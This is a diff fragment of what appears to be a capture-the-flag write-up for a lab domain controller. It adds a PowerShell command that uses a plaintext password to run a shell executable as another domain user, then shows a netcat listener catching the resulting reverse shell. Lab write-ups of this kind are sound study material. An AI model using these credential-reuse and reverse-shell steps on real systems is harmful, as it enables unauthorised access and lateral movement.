@@ -1198,3 +1198,31 @@ LDAP        10.129.82.45    389    DC               [+] danglingtree.htb\noah.b:
 ╰─                                                                                                                      ─╯
 
 ```
+
+``` powershell
+
+C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings>
+powershell -c "$pass=ConvertTo-SecureString 'RiverDragon#Storm25' -AsPlainText -Force;$cred=New-Object PSCredential('danglingtree\noah.b',$pass);Start-Process 'C:\Users\Public\shell.exe' -Credential $cred -NoNewWindow -WorkingDirectory 'C:\'"
+
+
+C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings>
+
+```
+
+``` bash
+
+❯ sudo nc -lvnp 443
+[sudo] password for joel:
+listening on [any] 443 ...
+connect to [10.10.15.166] from (UNKNOWN) [10.129.82.45] 51174
+Microsoft Windows [Version 10.0.26100.33158]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+danglingtree\noah.b
+
+C:\>
+
+
+```
